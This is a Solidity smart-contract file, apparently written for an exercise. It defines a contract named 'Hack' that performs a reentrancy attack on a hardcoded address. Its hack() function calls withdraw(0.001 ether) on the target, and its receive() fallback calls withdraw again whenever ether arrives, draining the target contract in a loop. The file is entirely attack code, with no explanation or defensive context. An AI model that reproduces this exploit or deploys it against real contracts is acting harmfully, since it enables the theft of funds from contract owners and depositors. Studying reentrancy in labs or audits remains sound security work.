// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


contract Hack {
    event GotMoney(uint256 money);

    constructor() public {

    }

    function hack() public {
        address addr = 0xA4C8495ba6243F718Aa01cE75Dbd0b63EFCe6f71;
        (uint256 amount) = 0.001 ether; 
        (bool success, ) = addr.call(abi.encodeWithSignature("withdraw(uint256)", amount));        
        require(success, "Call to withdraw() failed");        
    }

    receive() external payable {
        emit GotMoney(msg.value);
        address addr = 0xA4C8495ba6243F718Aa01cE75Dbd0b63EFCe6f71;
        (uint256 amount) = 0.001 ether; 
        (bool success, ) = addr.call(abi.encodeWithSignature("withdraw(uint256)", amount));        
        if(success) {}
    }
}
